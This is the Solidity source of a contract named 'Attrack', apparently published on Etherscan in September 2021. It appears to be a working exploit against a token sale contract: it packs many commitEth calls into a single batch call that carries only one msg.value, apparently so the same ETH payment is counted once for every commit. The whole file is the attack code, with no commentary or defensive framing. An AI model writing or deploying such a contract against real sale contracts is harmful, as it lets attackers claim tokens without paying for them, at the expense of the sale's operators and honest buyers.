/**
 *Submitted for verification at Etherscan.io on 2021-09-15
*/

pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

//0xeA46502Bb3Fd80EE157342b32FF274FCEe576cfc
contract Attrack {
    uint256 public total = 0;
    event result(bool succ);

    function GetcommitEth(address target) internal view returns (bytes memory) {
        bytes memory encodedata = abi.encodeWithSignature(
            "commitEth(address,bool)",
            target,
            true
        );
        return encodedata;
    }

    function attrackBatch(
        address bitdao,
        address target,
        uint256 count
    ) public payable {
        bytes[] memory commitEth = new bytes[](count);
        for (uint256 i = 0; i < count; i++) {
            commitEth[i] = GetcommitEth(target);
        }
        bytes memory encodedata = abi.encodeWithSignature(
            "batch(bytes[],bool)",
            commitEth,
            false
        );
        bitdao.call{value: msg.value}(encodedata);
    }

    function thisBalance() public view returns (uint256) {
        return address(this).balance;
    }

    fallback() external payable {}
}